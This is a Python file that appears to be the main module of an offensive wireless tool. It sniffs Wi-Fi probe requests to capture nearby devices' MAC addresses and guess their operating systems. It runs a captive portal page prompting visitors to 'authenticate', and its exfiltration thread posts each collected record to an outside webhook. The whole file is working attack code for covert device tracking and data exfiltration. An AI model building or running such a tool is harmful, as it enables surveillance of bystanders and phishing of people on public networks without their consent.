import threading
import queue
import yaml
import http.server
import socketserver
import requests
from scapy.all import sniff, ProbeReq
from core.fingerprint import detect_os

# Queue for communication between threads
analysis_queue = queue.Queue()
exfiltration_queue = queue.Queue()

def load_config():
    with open("config.yaml", "r") as f:
        return yaml.safe_load(f)

def sniffer_thread(config):
    print(f"[*] Starting Sniffer on {config['system']['interface']}...")
    def packet_callback(packet):
        if packet.haslayer(ProbeReq):
            analysis_queue.put(packet)

    sniff(iface=config['system']['interface'], prn=packet_callback, store=0)

def analysis_thread():
    print("[*] Starting Analysis Thread...")
    while True:
        packet = analysis_queue.get()
        if packet is None: break
        os_type = detect_os(packet)
        mac = packet.addr2 if hasattr(packet, 'addr2') else "Unknown"
        result = {"mac": mac, "os": os_type, "timestamp": "now"}
        print(f"[+] Analyzed: {result}")
        exfiltration_queue.put(result)
        analysis_queue.task_done()

def portal_thread(config):
    print(f"[*] Starting Portal on {config['captive_portal']['dns_server']}:{config['captive_portal']['port']}...")

    class PortalHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            # In a full implementation, this would call core/portal.py to serve the OS-specific template
            self.wfile.write(b"<html><body><h1>Welcome to the Captive Portal</h1><p>Please authenticate to continue.</p></body></html>")

    with socketserver.TCPServer((config['captive_portal']['dns_server'], config['captive_portal']['port']), PortalHandler) as httpd:
        httpd.serve_forever()

def exfiltration_thread(config):
    print("[*] Starting Exfiltration Thread...")
    webhook_url = config['exfiltration']['webhook_url']
    while True:
        data = exfiltration_queue.get()
        if data is None: break
        try:
            requests.post(webhook_url, json=data, timeout=5)
            print(f"[>] Exfiltrated data for {data.get('mac')}")
        except Exception as e:
            print(f"[!] Exfiltration error: {e}")
        exfiltration_queue.task_done()

def main():
    config = load_config()

    threads = [
        threading.Thread(target=sniffer_thread, args=(config,), daemon=True),
        threading.Thread(target=analysis_thread, daemon=True),
        threading.Thread(target=portal_thread, args=(config,), daemon=True),
        threading.Thread(target=exfiltration_thread, args=(config,), daemon=True),
    ]

    for t in threads:
        t.start()

    try:
        while True:
            import time
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")

if __name__ == "__main__":
    main()
